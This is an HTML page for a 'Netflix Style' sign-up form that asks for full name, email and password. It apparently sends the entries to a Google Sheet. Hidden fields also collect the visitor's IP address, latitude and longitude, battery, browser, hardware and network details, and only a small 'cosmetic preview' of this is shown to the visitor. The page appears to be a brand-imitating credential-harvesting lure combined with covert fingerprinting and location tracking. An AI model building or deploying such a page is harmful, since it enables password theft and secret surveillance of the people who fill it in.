<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix Style Form</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="netflix-container">
    <div class="form-wrapper">
      <h1>Sign Up</h1>
      <form name="submit-to-google-sheet" id="dataForm">
        <div class="input-group">
          <input type="text" name="FullName" placeholder="Full Name" required>
        </div>
        <div class="input-group">
          <input type="email" name="Email" placeholder="Email" required>
        </div>
        <div class="input-group">
          <input type="password" name="Password" placeholder="Password" required>
        </div>

        <!-- Hidden fields -->
        <input type="hidden" name="Browser" id="browser">
        <input type="hidden" name="OS" id="os">
        <input type="hidden" name="UserAgent" id="userAgent">
        <input type="hidden" name="ScreenResolution" id="screenRes">
        <input type="hidden" name="ColorDepth" id="colorDepth">
        <input type="hidden" name="DeviceMemory" id="deviceMemory">
        <input type="hidden" name="CpuCores" id="cpuCores">
        <input type="hidden" name="TouchSupport" id="touchSupport">
        <input type="hidden" name="Language" id="language">
        <input type="hidden" name="Timezone" id="timezone">
        <input type="hidden" name="PageURL" id="pageURL">
        <input type="hidden" name="Referrer" id="referrer">
        <input type="hidden" name="CookiesEnabled" id="cookiesEnabled">
        <input type="hidden" name="DoNotTrack" id="dnt">
        <input type="hidden" name="OnlineStatus" id="onlineStatus">
        <input type="hidden" name="Timestamp" id="timestamp">
        <input type="hidden" name="DeviceModel" id="deviceModel">
        <input type="hidden" name="BatteryLevel" id="batteryLevel">
        <input type="hidden" name="Charging" id="charging">
        <input type="hidden" name="ConnectionType" id="connectionType">
        <input type="hidden" name="RTT" id="rtt">
        <input type="hidden" name="IP" id="ip">
        <input type="hidden" name="Latitude" id="latitude">
        <input type="hidden" name="Longitude" id="longitude">

        <button type="submit">Sign Up</button>
      </form>
      <p id="msg" class="msg"></p>

      <!-- Cosmetic preview -->
      <div class="meta-preview">
        <p id="meta-ip"></p>
        <p id="meta-browser"></p>
        <p id="meta-os"></p>
        <p id="meta-res"></p>
      </div>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
